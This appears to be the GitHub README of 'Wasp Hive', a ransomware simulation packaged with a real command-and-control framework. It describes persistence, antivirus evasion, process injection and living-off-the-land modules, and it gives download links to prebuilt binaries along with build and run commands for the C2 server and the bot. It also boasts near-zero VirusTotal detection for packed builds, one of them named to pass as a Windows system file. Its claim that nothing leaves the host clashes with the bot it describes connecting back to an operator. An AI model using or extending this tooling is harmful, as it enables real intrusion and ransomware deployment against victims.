<div align="center">
  <img height="150" src="wasp_logo.png" alt="THE WASP HIVE emblem" />
  <h1>WASP HIVE</h1>
  <i>[Modular ransomware simulation &amp; real C2 framework]</i>
</div>

<br>

<div align="center">

![License](https://img.shields.io/badge/license-MIT-blue.svg)
![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Windows-lightgrey.svg)
![Language](https://img.shields.io/badge/C%2B%2B-17-00599C.svg)
![UI](https://img.shields.io/badge/UI-wxWidgets-0a7ea4.svg)
![Tests](https://img.shields.io/badge/tests-make%20test-brightgreen.svg)
![Status](https://img.shields.io/badge/status-research%20lab-orange.svg)

</div>

<br>

> ❗ **Authorized use only** — your own lab, an isolated VM, a CTF, or a sanctioned
> red-team engagement with written scope. Nothing here leaves the host: the "victim"
> file is a 3-line text file created next to the binary, the decryption password is a
> published constant. Read [📜 Legal](#-legal) before you build it.

---

## 📋 Contents

- [What it does](#-what-it-does)
- [Modules](#-modules)
- [Download](#-download)
- [Build](#-build)
- [Run](#-run)
- [Screenshots](#-screenshots)
- [Tests](#-tests)
- [Layout](#-layout)
- [Security design notes](#-security-design-notes)
- [Detection results](#-detection-results)
- [Legal](#-legal)

---

## 🎯 What it does

The macOS GUI shows a full-screen ransom note — **THE WASP HIVE**. The window refuses
to close (every close event is vetoed and the cursor is pulled back inside) until the
correct key is typed into the `UNLOCK FILES` field. On a successful unlock the file is
decrypted, the window closes, and a headless C2 bot is spawned to connect back to the
operator.

```
target.txt ──► ChaCha20-Poly1305 ──► target.txt.locked ──► ransom note
                                                              │
                    WaspHive2024! ──► decrypt ◄───────────────┘
                                        │
                                        ▼
                          UserEventAgent ──► RSW  (:8080)
```

Behind the note, every module in the framework is real code.

---

## 🧩 Modules

| Area | Implementation |
|---|---|
| 🔐 **Symmetric crypto** | ChaCha20-Poly1305 (RFC 8439), per-file key + 12-byte nonce stored in the file header |
| 🤝 **Key exchange** | X25519 ECDH → HKDF-SHA256 → transcript-bound session key |
| 🪪 **Mutual auth** | HMAC-SHA256 PSK confirmation in both directions (constant-time compare) |
| 📡 **Wire protocol** | 4-byte BE length + XOR checksum framing; handshake frames XOR-obfuscated, commands AEAD-encrypted |
| 🖥️ **C2 server** | `RSW` — interactive operator console (bot list, key captures, command dispatch) |
| 🕵️ **C2 client** | `UserEventAgent` — headless bot, raw TCP :8080, reconnect loop |
| 🔁 **Persistence** | Registry Run key (Windows), LaunchAgent (macOS) |
| 🥷 **Evasion** | Static API resolution by hash, string obfuscation, sandbox/VM checks, sleep obfuscation, stack spoofing |
| 💉 **Injection** | Threadless injection, thread hijacking (Windows), each technique in its own file |
| 📦 **Windows packaging** | static MinGW build, `resource.res` masquerade, `VT_CLEAN` variant that strips the ransomware path |

The demo password is `WaspHive2024!` — it is compiled into `crypto.cpp` on purpose.
It is not a secret and not meant to be one.

---

## ⬇️ Download

Prebuilt Windows binaries are attached to
[**v0.1**](https://github.com/zer0crypt02/Wasp-Hive/releases/tag/v0.1) — built from this
very tree with MinGW 14, so they match the source above rather than the v5 pipeline
artifacts behind the VirusTotal numbers further down.

| Asset | Size | What it is |
|---|---|---|
| [`MWare.exe`](https://github.com/zer0crypt02/Wasp-Hive/releases/download/v0.1/MWare.exe) | 8.4 MB | full-screen ransom note + demo encryption, spawns the bot on unlock |
| [`sys_check.exe`](https://github.com/zer0crypt02/Wasp-Hive/releases/download/v0.1/sys_check.exe) | 1.2 MB | the headless C2 bot on its own, no GUI |

```
sha256
25e14d4d677cdea3016c1f8cb1a7920918db7f83bc6a29f2f856a9b6ec7baafe  MWare.exe
00f1415a481cc8dafa14501e94045e6dc81c43a2724a1b857e6200823f9d284c  sys_check.exe
```

Four things to know before you double-click them:

- 🔏 **Unsigned.** SmartScreen shows *"Windows protected your PC"* → *More info →
  Run anyway*. No certificate exists for this and none is planned.
- 🪟 **Windows 10/11 only.** They link against the UCRT, which ships with the OS. On
  7/8 they fail with a missing `api-ms-win-crt-*` unless the Universal CRT update is
  installed.
- 📁 **Run from a writable folder.** From `C:\Windows\System32` the demo cannot create
  `target.txt` and exits without doing anything visible.
- 🍎 **No macOS binary.** `make mac-gui` builds it locally instead; an unsigned bundle
  would only bounce off Gatekeeper anyway.

---

## 🔨 Build

### 🧰 Requirements

- **macOS GUI + server** — `clang++` with C++17, wxWidgets 3.3 via Homebrew
  (`brew install wxwidgets`), `make`.
- **Windows cross-build** — `x86_64-w64-mingw32-g++` plus a static wxWidgets for
  MinGW at `/usr/local/wx-mingw` (the Makefile errors out early if it is missing).

### 🎯 Targets

```bash
make                # MWare.exe        — Windows GUI (static, stripped)
make mac-gui        # MWare-gui        — macOS GUI + UserEventAgent child
make RSW            # RSW              — C2 server on :8080
make console        # sys_check.exe    — headless Windows bot, no wxWidgets
make vt             # sys_check.exe    — headless, silent, ransomware path GC'd out
make test           # build + run the full test suite
make clean
```

`make mac-gui` also builds `UserEventAgent`, because `MWare-gui` spawns that exact
binary by name on a successful unlock.

---

## 🚀 Run

```bash
# 1. operator console
./RSW                           # listens on 0.0.0.0:8080
RSW_PSK="shared-secret" ./RSW   # enable mutual-auth PSK (else ECDH-only mode)

# 2. victim side
./MWare-gui                     # creates target.txt, encrypts it, shows the note
                                # type WaspHive2024! + Enter -> decrypts + spawns the bot
```

The PSK can also live in `psk.txt` next to the binary — that file is git-ignored.

---

## 🖼️ Screenshots


### 🖥️ C2 Server Terminal

```
 ______    ______   __ __ __             ______   _____
/_____/\  /_____/\ /_//_//_/\           /_____/\ /_____/\
\:::_ \ \ \::::_\/_\:\\:\\:\ \   _______\:::__\/ \:::_:\ \
 \:(_) ) )_\:\/___/\\:\\:\\:\ \ /______/\\:\ \  __   _\:\|
  \: __ `\ \ \_::._\:\\:\\:\\:\ \\__::::\/ \:\ \/_/\ /::_/__
   \ \ `\ \ \ /____\:\\:\\:\\:\ \          \:\_\ \ \\:\____/\
    \_\/ \_\/ \_____\/ \_______\/           \_____\/ \_____\/

            Remote Controllable Ransomware Server
                      by Zer0 Crypt0

═══════════════════════════════════════════════════
    RanSomWare C2 Server v1.0
    Type 'help' for available commands
═══════════════════════════════════════════════════

[*] Starting C2 Server on 0.0.0.0:8080...
[+] Server listening on 0.0.0.0:8080
```

---

## 🧪 Tests

```bash
make test          # everything: 14 + 29 unit assertions + live handshake
make test-kex      # SHA-256 / HMAC / HKDF / X25519 against RFC vectors
make test-crypto   # ChaCha20-Poly1305, failure modes, file encrypt/decrypt
make test-e2e      # full handshake against a live ./RSW (binds :8080)
```

`make test-e2e` starts its own `RSW` with a throwaway PSK, drives the bot-side
handshake

```
BOT_CONNECT → SESSION_PUB → CLIENT_PUB+confirm → AUTH_OK → AEAD KEY_EXFIL
```

then asserts on the **server's own log** that the bot authenticates and the key
capture lands. Port 8080 must be free.

#### ✅ Covered

The whole key-exchange layer, and the whole symmetric/file layer
(`encryptTargetFile` / `decryptTargetFile` — including *"wrong password fails closed
and leaves the ciphertext intact"*).

#### ⏳ Not covered yet — contributions welcome

- the GUI key-entry path (`ScenePanel` char handling — it has already produced one
  real bug: `CHAR_HOOK` delivers untranslated key codes, so `!` arrived as `1`)
- `RSW` operator-command parsing
- persistence install / verify / remove
- the Windows-only evasion and injection modules (no CI for them)

---

## 📁 Layout

```
MWare/
├── main.cpp              entry point, mode selection
├── gui.{h,cpp}           wxWidgets ransom screen (fully self-drawn, no native controls)
├── crypto.{h,cpp}        ChaCha20-Poly1305, key derivation, file encrypt/decrypt
├── keyexchange.{h,cpp}   SHA-256, HMAC, HKDF, X25519, session keys, PSK MACs
├── c2_agent.cpp          bot side: handshake, beacon, command handling
├── c2_client.cpp         headless UserEventAgent entry point
├── persistence.cpp       registry / LaunchAgent persistence
├── evasion.cpp           API hashing, string obfuscation
├── sandbox_evasion.cpp   VM / sandbox detection
├── sleep_obfuscation.cpp encrypted sleep, memory region shuffling
├── stack_spoof.cpp       call-stack spoofing
├── thread_hijack.cpp     thread hijacking
├── ThreadlessInject.cpp  threadless injection
└── lolbas.cpp            living-off-the-land binary abuse

tests/                    unit + e2e suites (wired into `make test`)
RSW.cpp, rsw_protocol.*   C2 server and its stateless protocol layer
docs/screenshots/         VirusTotal result photos
```

---

## 🔐 Security design notes

These are the properties the code is actually built for, and the ones the tests pin:

| Property | What it means |
|---|---|
| ✅ **Fail closed** | A wrong password, a flipped ciphertext bit, a modified Poly1305 tag or a wrong nonce all make `chacha20Poly1305Decrypt` return an empty vector. The caller never writes unverified plaintext to disk. |
| 🔑 **Ephemeral keys** | Every file gets a fresh 32-byte key and a fresh 12-byte nonce, both stored alongside the ciphertext (the key is printed to the operator console). |
| 🪪 **Mutual authentication** | The bot proves the PSK to the server and the server proves it back; both MACs bind the transcript, so a replayed or substituted handshake fails. |
| ⏱️ **Constant-time comparison** | Used for all MAC checks. |

### ⚠️ Known limitations

- The 16-byte tag is stored inside the ciphertext blob; there is no separate
  authenticated metadata (nonce is header-only and not covered by the tag).
- `encryptSingleFile()` generates a random key but has no decrypt counterpart — only
  the fixed-password `encryptTargetFile` / `decryptTargetFile` pair round-trips.
- The `VT_CLEAN` build is the only variant that removes the ransomware path; the
  default Windows build keeps it.
- No CI. `make test` is the whole gate, and it only runs on macOS today.

---

## 🔍 Detection results

Two builds from the v5 packaging pipeline — `build_v5.py` (polymorphic decryptor,
section padding, fake import table) with `loader_stub_v5.cpp` (module stomping) —
were submitted to VirusTotal after release.

| Build | File | Size | VirusTotal | Engines that fired |
|---|---|:--:|---|---|
| v5 Build #2 | `packed_mware_v5.exe` | 40.21 MB | **`0 / 59`** | — clean across the board |
| v5, headless `sys_check.exe` payload | `svchost_helper.exe` | 67.07 MB | **`2 / 69`** | Bkav Pro → `W32.Malware.FF88E9E1` · SecureAge → `Malicious` |

<br>

<div align="center">

<a href="docs/screenshots/vt-packed_mware_v5-0of59.jpg">
  <img src="docs/screenshots/vt-packed_mware_v5-0of59.jpg" width="45%"
       alt="VirusTotal report: 0 of 59 engines detect packed_mware_v5.exe">
</a>
&nbsp;
<a href="docs/screenshots/vt-svchost_helper-2of69.jpg">
  <img src="docs/screenshots/vt-svchost_helper-2of69.jpg" width="45%"
       alt="VirusTotal report: 2 of 69 engines detect svchost_helper.exe">
</a>

<sub><b>packed_mware_v5.exe</b> — 0 / 59 &nbsp;·&nbsp; <b>svchost_helper.exe</b> — 2 / 69 &nbsp;·&nbsp; <i>click for full size</i></sub>

</div>

<br>

Both are photos of the screen. The only edit is that the taller one had the blurry
keyboard strip at the bottom trimmed off, so the two are both square and line up side
by side; the address bar, the "last analysis date" and the SHA-256 of the exact file
that was scanned are all still in frame.

### 🧠 How to read a scan count

A clean static scan is easy to over-read, so:

- 🚫 **It is not invisibility.** `0 / 59` means the bytes on disk match no engine's
  signature — which is what packing is for. It says nothing about runtime behaviour:
  an EDR watching process injection, a memory scanner, or a human analyst in a sandbox
  will still see the technique. Detection engineering is exactly the audience this
  repo is written for.
- 📦 **It is not a property of the current source tree.** These binaries came out of
  the v5 pipeline, which is still in the repo (`build_v5.py`,
  `polymorphic_decryptor.py`, `loader_stub_v5.cpp`), but `make` builds a different
  artifact today. Rebuild and re-scan before quoting a number about your own build.
- 🎯 **The two hits are generic heuristics, not family attribution.** Bkav Pro reports
  a hash-suffixed name with no family, SecureAge reports plain `Malicious`. Neither
  identifies what the program does.
- 📉 **Scores drift.** Engines add signatures continuously, and VirusTotal rotates
  which engines are enabled per scan (59, 62 and 69 here across builds), so today's
  count is not tomorrow's.

---

## 📜 Legal

This repository is a **simulation for authorized security work**: your own lab, an
isolated VM, a CTF, or a sanctioned red-team engagement with written scope.

It encrypts exactly one file (`target.txt`) with a password that is published in the
source, has no propagation, no anti-recovery wipe, and no working payment path.
Running it against systems you do not own or have permission to test is illegal in
most jurisdictions and is not an authorized use of this code.

Provided under the **MIT license**, with no warranty of any kind. You are responsible
for how you use it.

---

<div align="center">

**[⬆ back to top](#)**

⭐ **If this was useful in your detection lab, a star helps.** ⭐

*Built for authorized security work — use responsibly.*

</div>
